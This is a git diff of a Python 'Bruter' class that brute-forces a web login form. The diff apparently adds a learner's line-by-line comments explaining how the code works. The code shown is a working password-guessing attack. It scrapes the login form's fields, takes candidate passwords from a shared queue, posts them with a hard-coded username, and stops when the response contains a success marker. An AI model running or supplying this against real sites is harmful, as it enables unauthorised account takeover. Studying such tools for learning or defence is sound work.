@@ -72,7 +72,7 @@ class Bruter:
         session = requests.Session()                            # Creates a session object to remember things(cookies;settings;reused network connections) between requests. 
         # Sends a GET request to the URL, 
         # and saves the server’s reply in resp0:
-        resp0 = session.get(self.url)                           # The thread is using the same session object for both requests(GET & POST).
+        resp0 = session.get(self.url)                           # The thread is using the same session object for both requests(GET & POST). 10 threads create 10 separate sessions.
         # Passes the raw response body (resp0.content) 
         # into get_params:
         params = get_params(resp0.content)                      # get_params() returns a dictionary of HTML input names/values. That dictionary is stored in `params`.
@@ -83,12 +83,16 @@ class Bruter:
         # Starts a loop.It continues while: 
         # 1. the queue is not empty; 2. success has not been found.
         while not passwords.empty() and not self.found:
-            time.sleep(5)
-            passwd = passwords.get()
-            print(f'Trying username/password {self.username}/{passwd:<10}')
-            params['pwd'] = passwd
+            time.sleep(5)                                       # Pauses the current thread fro 5 secs.
+            passwd = passwords.get()                            # Gets one item from the shared queue.
+            print(f'Trying username/password {self.username}/{passwd:<10}') # Prints the username and current password candidate.
+            params['pwd'] = passwd                              # Sets it to the current candidate word. 
+                                                                # So now `params` includes both: 1. hard-coded username; 2. current password candidate. 
 
-            resp1 = session.post(self.url, data=params)         # 10 threads create 10 separate sessions.
+            
+            # Sends a POST request to the same URL.
+            # The server response is stored in `resp1`:          
+            resp1 = session.post(self.url, data=params)         # data=params means the dictionary is sent as form data like a normal HTML form in a browser: encoding with 'application/x-www-form-urlencoded': log=admin&pwd=1234.           
             if SUCCESS in resp1.content.decode():
                 self.found = True
                 print(f"\nBruteforcing successful.")
